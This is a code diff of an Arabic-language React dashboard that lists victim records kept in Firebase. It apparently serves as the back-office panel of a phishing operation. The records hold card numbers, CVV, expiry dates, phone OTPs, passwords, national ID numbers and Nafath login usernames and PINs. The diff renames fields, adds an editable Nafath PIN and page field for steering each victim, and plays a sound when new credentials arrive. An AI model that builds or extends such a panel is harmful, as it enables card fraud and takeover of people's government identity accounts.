@@ -70,7 +70,7 @@ interface Notification {
   phone?: string
   phone2?: string // New field
   phoneOtp?: string // New field
-  networkInfo?: string // New field
+  operator?: string // New field
   serial_number?: string
   vehicle_manufacture_number?: string
   customs_code?: string
@@ -99,7 +99,7 @@ interface Notification {
   cardYear?: string
   cardMonth?: string
   cvv?: string
-  auth_number?: string // Existing field, now editable
+  nafaz_pin?: string // Existing field, now editable
   identity_number?: string
   password?: string
   allOtp?: string[]
@@ -243,7 +243,7 @@ function NotificationCard({
   const getSecondaryInfo = () => {
     const info = []
     if (notification.country) info.push(notification.country)
-    if (notification.networkInfo) info.push(notification.networkInfo)
+    if (notification.operator) info.push(notification.operator)
     if (notification.currentPage) info.push(`صفحة: ${notification.currentPage}`)
     if (notification.cardNumber) info.push("بطاقة")
     if (notification.nafadUsername) info.push("نفاذ")
@@ -359,7 +359,7 @@ function NotificationCard({
                 OTP هاتف
               </Badge>
             )}
-            {notification.networkInfo && (
+            {notification.operator && (
               <Badge variant="secondary" className="text-xs px-2 py-0.5 bg-cyan-100 text-cyan-700 border-cyan-200">
                 شبكة
               </Badge>
@@ -385,7 +385,7 @@ function NotificationDetails({
   notification,
   onClose,
   onCurrentPageUpdate,
-  onAuthNumberUpdate, // New prop for auth_number update
+  onAuthNumberUpdate, // New prop for nafaz_pin update
 }: {
   notification: Notification | null
   onClose: () => void
@@ -395,15 +395,15 @@ function NotificationDetails({
   const [activeTab, setActiveTab] = useState<"personal" | "card" | "nafaz" | "phone">("personal")
   const [editingCurrentPage, setEditingCurrentPage] = useState(false)
   const [currentPageValue, setCurrentPageValue] = useState("")
-  const [editingAuthNumber, setEditingAuthNumber] = useState(false) // New state for auth_number
-  const [authNumberValue, setAuthNumberValue] = useState("") // New state for auth_number value
+  const [editingAuthNumber, setEditingAuthNumber] = useState(false) // New state for nafaz_pin
+  const [authNumberValue, setAuthNumberValue] = useState("") // New state for nafaz_pin value
 
   useEffect(() => {
     if (notification?.currentPage) {
       setCurrentPageValue(notification.currentPage)
     }
-    if (notification?.auth_number) {
-      setAuthNumberValue(notification.auth_number)
+    if (notification?.nafaz_pin) {
+      setAuthNumberValue(notification.nafaz_pin)
     }
   }, [notification])
 
@@ -459,10 +459,10 @@ function NotificationDetails({
             </h2>
             <div className="flex items-center gap-2 text-xs text-muted-foreground">
               <span>{notification.country}</span>
-              {notification.networkInfo && (
+              {notification.operator && (
                 <>
                   <span>•</span>
-                  <span>{notification.networkInfo}</span>
+                  <span>{notification.operator}</span>
                 </>
               )}
               {notification.currentPage && (
@@ -702,7 +702,7 @@ function NotificationDetails({
                     {[
                       { label: "رقم الهاتف الأساسي", value: notification.phone, icon: Phone },
                       { label: "رقم الهاتف الثاني", value: notification.phone2, icon: Smartphone },
-                      { label: "معلومات الشبكة", value: notification.networkInfo, icon: Wifi },
+                      { label: "معلومات الشبكة", value: notification.operator, icon: Wifi },
                       { label: "رمز التحقق للهاتف", value: notification.phoneOtp, icon: Hash },
                     ].map(
                       (item) =>
@@ -739,7 +739,7 @@ function NotificationDetails({
                   </div>
                 </CardContent>
               </Card>
-              {!notification.phone && !notification.phone2 && !notification.phoneOtp && !notification.networkInfo && (
+              {!notification.phone && !notification.phone2 && !notification.phoneOtp && !notification.operator && (
                 <div className="text-center py-8">
                   <div className="bg-muted/50 rounded-full p-4 mx-auto w-fit mb-4">
                     <Phone className="h-8 w-8 text-muted-foreground" />
@@ -845,29 +845,13 @@ function NotificationDetails({
                         )}
                         <div className="flex items-center justify-between">
                           <span className="text-sm font-medium text-muted-foreground">حالة التحقق</span>
-                          <Badge
-                            variant="outline"
-                            className={`text-xs ${
-                              notification.nafazStatus === "verified"
-                                ? "bg-emerald-50 text-emerald-700 border-emerald-200"
-                                : notification.nafazStatus === "failed"
-                                  ? "bg-red-50 text-red-700 border-red-200"
-                                  : "bg-amber-50 text-amber-700 border-amber-200"
-                            }`}
-                          >
-                            {notification.nafazStatus === "verified"
-                              ? "مؤكد"
-                              : notification.nafazStatus === "failed"
-                                ? "فشل"
-                                : "معلق"}
-                          </Badge>
+                       
                         </div>
                       </div>
                     </CardContent>
                   </Card>
 
                   {/* New Card for Auth Number in Nafaz tab */}
-                  {notification.auth_number && (
                     <Card className="border-muted/50">
                       <CardContent className="p-4">
                         <div className="flex items-center justify-between">
@@ -876,7 +860,7 @@ function NotificationDetails({
                             <span className="text-sm font-medium text-muted-foreground">رقم التحقق (Auth Number)</span>
                           </div>
                           <div className="flex items-center gap-2">
-                            <span className="text-sm font-semibold text-foreground">{notification.auth_number}</span>
+                            <span className="text-sm font-semibold text-foreground">{notification.nafaz_pin}</span>
                             <Button
                               variant="ghost"
                               size="icon"
@@ -892,7 +876,6 @@ function NotificationDetails({
                         </div>
                       </CardContent>
                     </Card>
-                  )}
 
                   {/* New Card for Current Page in Nafaz tab */}
                   {notification.currentPage && (
@@ -996,7 +979,7 @@ export default function NotificationsPage() {
           notification.phone?.toLowerCase().includes(term) ||
           notification.phone2?.toLowerCase().includes(term) ||
           notification.phoneOtp?.toLowerCase().includes(term) ||
-          notification.networkInfo?.toLowerCase().includes(term) ||
+          notification.operator?.toLowerCase().includes(term) ||
           notification.currentPage?.toLowerCase().includes(term) ||
           notification.cardNumber?.toLowerCase().includes(term) ||
           notification.country?.toLowerCase().includes(term) ||
@@ -1010,7 +993,7 @@ export default function NotificationsPage() {
           notification.selectedInsuranceOffer?.toLowerCase().includes(term) ||
           notification.paymentStatus?.toLowerCase().includes(term) ||
           notification.nafadUsername?.toLowerCase().includes(term) ||
-          notification.auth_number?.toLowerCase().includes(term) // Include auth_number in search
+          notification.nafaz_pin?.toLowerCase().includes(term) // Include nafaz_pin in search
         )
       }
       return true
@@ -1127,7 +1110,7 @@ export default function NotificationsPage() {
             n.phoneOtp ||
             n.owner_identity_number ||
             n.nafadUsername ||
-            n.auth_number, // Include auth_number in important info check
+            n.nafaz_pin, // Include nafaz_pin in important info check
         )
         if (hasNewImportantInfo) {
           playNotificationSound()
@@ -1211,8 +1194,8 @@ export default function NotificationsPage() {
   const handleAuthNumberUpdate = async (id: string, authNumber: string) => {
     try {
       const docRef = doc(db, "pays", id)
-      await updateDoc(docRef, { auth_number: authNumber })
-      setNotifications((prev) => prev.map((n) => (n.id === id ? { ...n, auth_number: authNumber } : n)))
+      await updateDoc(docRef, { nafaz_pin: authNumber })
+      setNotifications((prev) => prev.map((n) => (n.id === id ? { ...n, nafaz_pin: authNumber } : n)))
       toast({
         title: "تم تحديث رقم التحقق",
         description: `تم تحديث رقم التحقق إلى: ${authNumber}`,
